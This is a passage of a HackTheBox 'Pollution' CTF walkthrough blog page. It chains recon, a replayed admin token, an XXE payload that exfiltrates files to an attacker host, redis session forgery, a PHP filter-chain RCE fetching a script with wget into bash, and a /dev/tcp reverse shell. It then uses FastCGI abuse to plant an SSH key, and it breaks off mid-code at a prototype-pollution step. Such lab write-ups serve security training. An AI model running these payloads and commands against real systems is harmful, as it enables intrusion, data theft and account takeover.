@@ -1,0 +1,447 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8083932952140695"
+     crossorigin="anonymous"></script>
+    <title>HTB - Pollution [Hard] // MeowMeowAttack&#39;s security.log</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.08c75f03335e384efd6114f8f43e0cfe7b8782f807f0ffcad6fd48c7431e850e.css" />
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-SLVHGT13XR', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Pollution [Hard]"/>
+<meta name="twitter:description" content="TCP Scan &gt; TARGET=&lt;target&gt; &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0) 80/tcp open http syn-ack Apache httpd 2.4.54 ((Debian)) |_http-server-header: Apache/2.4.54 (Debian) 6379/tcp open redis Redis key-value store Found: collect.htb Web Enum Subdomain search &gt; wfuzz -c -f subdomains."/>
+
+    <meta property="og:title" content="HTB - Pollution [Hard]" />
+<meta property="og:description" content="TCP Scan &gt; TARGET=&lt;target&gt; &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0) 80/tcp open http syn-ack Apache httpd 2.4.54 ((Debian)) |_http-server-header: Apache/2.4.54 (Debian) 6379/tcp open redis Redis key-value store Found: collect.htb Web Enum Subdomain search &gt; wfuzz -c -f subdomains." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/pollution/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-12-06T09:50:27+13:00" />
+<meta property="article:modified_time" content="2022-12-06T09:50:27+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>MeowMeow is a pentest meow, a full of justice meow, and a nonsense-free meow. b******t, just filling this up for better SEO.</p>
+      <a style="font-size: smaller;" href="/privacy/">Privacy Policy</a>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="meowmeowattack" data-description="Support me on Buy me a coffee!" data-message="" data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+      <script src="/js/crypto-js.min.js"></script>
+      <script src="/js/dice.js"></script>
+      <h1 class ="post-title">HTB - Pollution [Hard]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 6, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          9 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="tcp-scan">TCP Scan</h2>
+<pre tabindex="0"><code>&gt; TARGET=&lt;target&gt; &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT  STATE SERVICE REASON  VERSION
+22/tcp open  ssh    syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
+|_http-server-header: Apache/2.4.54 (Debian)
+6379/tcp open  redis   Redis key-value store
+</code></pre><ul>
+<li>Found: <code>collect.htb</code></li>
+</ul>
+<h2 id="web-enum">Web Enum</h2>
+<ul>
+<li>Subdomain search</li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &#34;http://collect.htb/&#34; -H &#34;Host: FUZZ.collect.htb&#34; --hl 541
+
+000000023:   200        336 L    1220 W     14098 Ch    &#34;forum&#34;
+000002341:   401        14 L     54 W       469 Ch      &#34;developers&#34;
+</code></pre><ul>
+<li>Add both subdomains to <code>/etc/hosts</code></li>
+<li>From <code>http://forum.collect.htb/memberlist.php</code>, we can find a list of members</li>
+<li>We can register a user at <code>http://forum.collect.htb/member.php</code></li>
+<li>From <code>http://forum.collect.htb/portal.php</code>, we learnt there is an API for access</li>
+</ul>
+<pre tabindex="0"><code>Posted by: victor - 10-19-2022, 08:03 PM - Forum: Collect Forum - Replies (3)
+Hello, I am unable to login to the Pollution API. Can someone help me? 
+</code></pre><ul>
+<li>From <code>http://forum.collect.htb/showthread.php?tid=2</code>, we learnt there is a subdomain that&rsquo;s most-likely for developers and is access controlled (i.e 401). This is very likely the <code>developers</code> subdomain we found previously that gave us a 401 response.</li>
+<li>From <code>http://forum.collect.htb/showthread.php?tid=9</code>, we learnt this instance might have been deployed by k8s, and the sysadmin might be new to k8s hence there is likely to be misconfigurations.</li>
+<li>From <code>http://forum.collect.htb/showthread.php?tid=13</code>, there is an attachement from <code>victor</code>, note the following item</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;item&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;time&gt;</span>Thu Sep 22 18:29:34 BRT 2022<span style="color:#f92672">&lt;/time&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;url&gt;</span><span style="color:#75715e">&lt;![CDATA[http://collect.htb/set/role/admin]]&gt;</span><span style="color:#f92672">&lt;/url&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;host</span> <span style="color:#a6e22e">ip=</span><span style="color:#e6db74">&#34;192.168.1.6&#34;</span><span style="color:#f92672">&gt;</span>collect.htb<span style="color:#f92672">&lt;/host&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;port&gt;</span>80<span style="color:#f92672">&lt;/port&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;protocol&gt;</span>http<span style="color:#f92672">&lt;/protocol&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;method&gt;</span><span style="color:#75715e">&lt;![CDATA[POST]]&gt;</span><span style="color:#f92672">&lt;/method&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;path&gt;</span><span style="color:#75715e">&lt;![CDATA[/set/role/admin]]&gt;</span><span style="color:#f92672">&lt;/path&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;extension&gt;</span>null<span style="color:#f92672">&lt;/extension&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;request</span> <span style="color:#a6e22e">base64=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#75715e">&lt;![CDATA[UE9TVCAvc2V0L3JvbGUvYWRtaW4gSFRUUC8xLjENCkhvc3Q6IGNvbGxlY3QuaHRiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDQuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDQuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IHB0LUJSLHB0O3E9MC44LGVuLVVTO3E9MC41LGVuO3E9MC4zDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkNvbm5lY3Rpb246IGNsb3NlDQpDb29raWU6IFBIUFNFU1NJRD1yOHFuZTIwaGlnMWszbGk2cHJnazkxdDMzag0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAzOA0KDQp0b2tlbj1kZGFjNjJhMjgyNTQ1NjEwMDEyNzc3MjdjYjM5N2JhZg==]]&gt;</span><span style="color:#f92672">&lt;/request&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;status&gt;</span>302<span style="color:#f92672">&lt;/status&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;responselength&gt;</span>296<span style="color:#f92672">&lt;/responselength&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;mimetype&gt;&lt;/mimetype&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;response</span> <span style="color:#a6e22e">base64=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#75715e">&lt;![CDATA[SFRUUC8xLjEgMzAyIEZvdW5kDQpEYXRlOiBUaHUsIDIyIFNlcCAyMDIyIDIxOjMwOjE0IEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU0IChEZWJpYW4pDQpFeHBpcmVzOiBUaHUsIDE5IE5vdiAxOTgxIDA4OjUyOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUNClByYWdtYTogbm8tY2FjaGUNCkxvY2F0aW9uOiAvaG9tZQ0KQ29udGVudC1MZW5ndGg6IDANCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOA0KDQo=]]&gt;</span><span style="color:#f92672">&lt;/response&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;comment&gt;&lt;/comment&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/item&gt;</span>
+</span></span></code></pre></div><h2 id="getting-web-admin-access">Getting web admin access</h2>
+<ul>
+<li>From the above obtained payload, we can base64 decode the request to retrieve a token. The response contains nothing interesting, only a 302 response.</li>
+</ul>
+<pre tabindex="0"><code>POST /set/role/admin HTTP/1.1
+Host: collect.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+
+token=ddac62a28254561001277727cb397baf
+</code></pre><ul>
+<li>This request looks like an attempt to assign the user with admin role, and the token must be privileged. Let&rsquo;s imitate this request and set our current user as admin.</li>
+<li>Note that this request is sent against the <code>collect.htb</code> domain, rather than the <code>forum.collect.htb</code> domain. Therefore, we need to register a new user at <code>http://collect.htb/regsiter</code> and then send a post request to change our user role to admin</li>
+</ul>
+<pre tabindex="0"><code>POST /set/role/admin HTTP/1.1
+Host: collect.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+Origin: http://collect.htb
+Connection: close
+Referer: http://collect.htb/login
+Cookie: PHPSESSID=sq52a734q850al5gri71pci0uh
+Upgrade-Insecure-Requests: 1
+
+token=ddac62a28254561001277727cb397baf
+</code></pre><ul>
+<li>After the post, we are able to browse to the admin page <code>http://collect.htb/admin</code>, where we can use the API registration form to send requests to the API endpoint and register a user to access the API.</li>
+</ul>
+<pre tabindex="0"><code>POST /api HTTP/1.1
+Host: collect.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-type: application/x-www-form-urlencoded
+Content-Length: 174
+Origin: http://collect.htb
+Connection: close
+Referer: http://collect.htb/admin
+Cookie: PHPSESSID=sq52a734q850al5gri71pci0uh
+
+manage_api=&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;root&gt;&lt;method&gt;POST&lt;/method&gt;&lt;uri&gt;/auth/register&lt;/uri&gt;&lt;user&gt;&lt;username&gt;meow&lt;/username&gt;&lt;password&gt;test123&lt;/password&gt;&lt;/user&gt;&lt;/root&gt;
+</code></pre><ul>
+<li>While we are here, let&rsquo;s register our current user (in my case: meow) as a user to access API. This will become useful later during the root PE.</li>
+<li>With some trials and errors, the <code>manage_api</code> field was found to be vulnerable to XXE, you can read more detail about this from here: <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#html-entities">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#html-entities</a></li>
+</ul>
+<h2 id="arbitrary-file-read">Arbitrary file read</h2>
+<ul>
+<li>Use the following payload and hosting a dtd file, we are able to read arbitrary files on the target (base64 encoded)</li>
+</ul>
+<pre tabindex="0"><code># the payload is structured like below, replace &lt;xxe-payload&gt; with your payload:
+# manage_api=&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;xxe-payload&gt;&lt;root&gt;&lt;method&gt;POST&lt;/method&gt;&lt;uri&gt;/auth/register&lt;/uri&gt;&lt;user&gt;&lt;username&gt;meow&lt;/username&gt;&lt;password&gt;test123&lt;/password&gt;&lt;/user&gt;&lt;/root&gt;
+
+# POST body
+# Note: you don&#39;t need to url encode the post body or substitute the spaces with +, somehow the format works
+manage_api=&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;http://&lt;attacker-ip&gt;/file.dtd&#34;&gt; %xxe;]&gt;&lt;root&gt;&lt;method&gt;POST&lt;/method&gt;&lt;uri&gt;/auth/register&lt;/uri&gt;&lt;user&gt;&lt;username&gt;meow&lt;/username&gt;&lt;password&gt;test123&lt;/password&gt;&lt;/user&gt;&lt;/root&gt;
+
+# file.dtd, serve this file with a http server
+&lt;!ENTITY % file SYSTEM &#39;php://filter/convert.base64-encode/resource=index.php&#39;&gt;
+&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http://&lt;attacker-ip&gt;/?file=%file;&#39;&gt;&#34;&gt;
+%eval;
+%exfiltrate;
+</code></pre><ul>
+<li>Once we are able to read arbitrary files, read <code>../bootstrp.php</code> file which contains a password for redis server</li>
+</ul>
+<blockquote>
+<div id="pass1"></div>
+<script type="text/javascript">
+    window.onload = showHidden("pass1", "U2FsdGVkX1+1uPWvz++3QzCOqyZc9q+IwX2ikH9njj7wjoUQ1JiN6+jPkZzLl7lk",  2 );
+</script>
+
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;session.save_handler&#39;</span>,<span style="color:#e6db74">&#39;redis&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;session.save_path&#39;</span>,<span style="color:#e6db74">&#39;tcp://127.0.0.1:6379/?auth=C**************S&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require</span> <span style="color:#e6db74">&#39;../vendor/autoload.php&#39;</span>;
+</span></span></code></pre></div><ul>
+<li>There is also a developer password at <code>/var/www/developers/.htpasswd</code>, which is hashed using apache&rsquo;s <code>apr1</code>, this can be cracked using hashcat.</li>
+</ul>
+<blockquote>
+<div id="pass2"></div>
+<script type="text/javascript">
+    window.onload = showHidden("pass2", "U2FsdGVkX18mPCKjwuaKQ8qOy+QyApDWVjApzV2jOME=",  2 );
+</script>
+
+</blockquote>
+<pre tabindex="0"><code>developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.*******
+
+&gt; hashcat -m 1600 hash.txt rockyou.txt
+</code></pre><h2 id="access-developerscollecthtb-via-redis">Access developers.collect.htb via redis</h2>
+<ul>
+<li>After cracking the password of <code>developers_group</code>, we are able to pass the basic auth at <code>developers.collect.htb</code> and then we are confronted with another login page.</li>
+<li>From the previously obtained password for redis, we are able to access the redis server and authenticate</li>
+</ul>
+<pre tabindex="0"><code>&gt; redis-cli -h collect.htb                    
+collect.htb:6379&gt; auth C**************S
+OK
+</code></pre><ul>
+<li>Inspecting the keys, we found our user session in the server. This server may be used for session management. Hence, by tweaking with the keys, we might be able to bypass the login page.</li>
+</ul>
+<pre tabindex="0"><code>collect.htb:6379&gt; keys *
+1) &#34;PHPREDIS_SESSION:&lt;your-session-id&gt;&#34;
+</code></pre><ul>
+<li>In order to find a way to bypass, we need to look at how a session is managed. However, if we just login to <code>developers.collect.htb</code>, the session content will be empty (presumably the session contents is not applicable to basic auth).</li>
+<li>So, to examine a valid session content, let&rsquo;s perform a fresh <code>register</code> and <code>login</code> at <code>collect.htb</code> and then examine the keys. Apparently, we can exploit this to pass the login page at <code>developers.collect.htb</code></li>
+</ul>
+<pre tabindex="0"><code>collect.htb:6379&gt; get PHPREDIS_SESSION:&lt;your-session-id&gt;
+&#34;username|s:4:\&#34;meow\&#34;;role|s:4:\&#34;user\&#34;;&#34;
+</code></pre><ul>
+<li>Now, check <code>developers.collect.htb</code> and make a note of our <code>PHPREDIS_SESSION</code> value and replace the redis record for our user session using the following payload to bypass the login page. Note the extra bit <code>auth|s:1:\&quot;a\&quot;;</code></li>
+</ul>
+<pre tabindex="0"><code>collect.htb:6379&gt; set PHPREDIS_SESSION:&lt;your-session-id&gt; &#34;username|s:4:\&#34;meow\&#34;;role|s:5:\&#34;admin\&#34;;auth|s:1:\&#34;a\&#34;;&#34;
+</code></pre><ul>
+<li>Once we have replaced the redis record, <code>refresh</code> the developers page and we are now able to browse into <code>http://developers.collect.htb/?page=home</code></li>
+</ul>
+<h2 id="rce-www-data">RCE: www-data</h2>
+<ul>
+<li>The url parameter <code>page</code> at <code>http://developers.collect.htb/?page=&lt;rce&gt;</code> is vulnerable to RCE. To exploit this, we need to introduce a tool using php filter chain to bypass the checks: <a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></li>
+</ul>
+<pre tabindex="0"><code># this will generate a very long output
+&gt; python3 php_filter_chain_generator.py --chain &#39;&lt;?php phpinfo(); ?&gt;  &#39;
+</code></pre><ul>
+<li>Paste the above output into the <code>page</code> parameter and observe your code being executed by the webapp.</li>
+<li>Now, we can utilise this to create a reverse shell. Note: the generated result is lengthy and there is a character limit on the site. Hence, we need to use php shorthand forms to make our payload as short as possible</li>
+</ul>
+<pre tabindex="0"><code># php tag short form, i.e &lt;?php ?&gt;: &lt;?= ?&gt;
+# php executor short form, i.e system(&#39;&lt;cmd&gt;&#39;): ``
+# result short form payload: &lt;?= `&lt;cmd&gt;` ?&gt;
+</code></pre><ul>
+<li>Here, we can use wget to fetch a bash script and let the script run after fetching</li>
+</ul>
+<pre tabindex="0"><code># prepare a bash payload and save in a file called `m`, then serve it with a http server
+bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/4444 0&gt;&amp;1
+
+# generate a chain to wget the script and run it
+&gt; python3 php_filter_chain_generator.py --chain &#39;&lt;?= `wget -O - &lt;attacker-ip&gt;/m|bash` ?&gt;&#39;
+
+# setup a nc listener to receive the reverse shell
+</code></pre><ul>
+<li>After following the above, we should now have a reverse shell as <code>www-data</code></li>
+</ul>
+<h2 id="pe-victor">PE: victor</h2>
+<ul>
+<li>Perform enum, we found a db password in <code>/var/www/developers/login.php</code></li>
+</ul>
+<blockquote>
+<div id="pass3"></div>
+<script type="text/javascript">
+    window.onload = showHidden("pass3", "U2FsdGVkX1/MEqXU88/HOcTWrXyvxViqrstHPotRg+XeSzRKETDV0Aloq/neebcg",  2 );
+</script>
+
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$db <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>(<span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#e6db74">&#34;webapp_user&#34;</span>, <span style="color:#e6db74">&#34;S******************1&#34;</span>, <span style="color:#e6db74">&#34;developers&#34;</span>);
+</span></span></code></pre></div><ul>
+<li>Login to the db and enum the db</li>
+</ul>
+<pre tabindex="0"><code>&gt; mysql -u webapp_user -p&#39;S******************1&#39; -D developers -e &#39;show tables;&#39;
+users
+
+&gt; mysql -u webapp_user -p&#39;S******************1&#39; -D developers -e &#39;select * from users;&#39;
+id      username        password
+1       admin   c89efc49ddc58ee4781b02becc788d14
+
+# The password hash is not crackable
+</code></pre><ul>
+<li>Run linpeas and note the following info, there is an app running at 127.0.0.1:9000, this is a fastcgi app. And there is a php application pool run as <code>victor</code>, which is our next target</li>
+</ul>
+<pre tabindex="0"><code>[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 ::1:6379                :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+
+[+] Cleaned processes
+[i] Check weird &amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+victor      1096  0.0  0.3 265840 15932 ?        S    Dec03   0:00  _ php-fpm: pool victor
+</code></pre><ul>
+<li>FastCGI can be exploited to execute arbitrary code as <code>victor</code>, refer to this link for more detail: <a href="https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi">https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi</a></li>
+<li>A script can be used to help the execution: <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></li>
+</ul>
+<pre tabindex="0"><code># note that the &lt;file&gt; parameter can be any writeable file we create on the target
+# in here, i created a file at /tmp/index.php
+&gt; python3 fpm.py -c &#39;&lt;?php system(&#34;id&#34;); exit; ?&gt;&#39; 127.0.0.1 /tmp/index.php
+uid=1002(victor) gid=1002(victor) groups=1002(victor)
+</code></pre><ul>
+<li>For a ssh shell as <code>victor</code>, we can echo our ssh public key into victor&rsquo;s <code>.ssh/authorized_keys</code> file</li>
+</ul>
+<pre tabindex="0"><code>&gt; python3 fpm.py -c &#39;&lt;?php system(&#34;echo \&#34;id_rsa.pub\&#34; &gt; /home/victor/.ssh/authorized_keys&#34;); exit; ?&gt;&#39; 127.0.0.1 /tmp/index.php
+</code></pre><ul>
+<li>ssh into the target as victor and fetch the user flag</li>
+</ul>
+<pre tabindex="0"><code>&gt; ssh victor@collect.htb
+</code></pre><h2 id="pe-root">PE: root</h2>
+<ul>
+<li>Re-run linpeas as <code>victor</code>, note the following, this is likely the API service and it&rsquo;s run by <code>root</code></li>
+</ul>
+<pre tabindex="0"><code>[+] Cleaned processes
+[i] Check weird &amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+root        1331  0.0  1.9 1680592 76708 ?       Sl   Dec03   0:01  _ /usr/bin/node /root/pollution_api/index.js
+</code></pre><ul>
+<li>There is a copy of the code in victor&rsquo;s home directory: <code>/home/victor/pollution_api</code></li>
+<li>Inspecting the code, we can spot a vulnerable function at <code>pollution_api/controllers/Messages_send.js</code> that can be exploited using prototype pollutioning, note the line <code>_.merge(message, req.body)</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">messages_send</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span>(<span style="color:#a6e22e">req</span>,<span style="color:#a6e22e">res</span>)=&gt;{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">decodejwt</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">headers</span>[<span style="color:#e6db74">&#39;x-access-token&#39;</span>])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">text</span>){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">message</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">user_sent</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">user</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">title</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Message for admins&#34;</span>,
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_</span>.<span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">message</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#39;/home/victor/pollution_api/log.sh log_message&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Message</span>.<span style="color:#a6e22e">create</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">text</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">message</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">user_sent</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">user</span>
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>
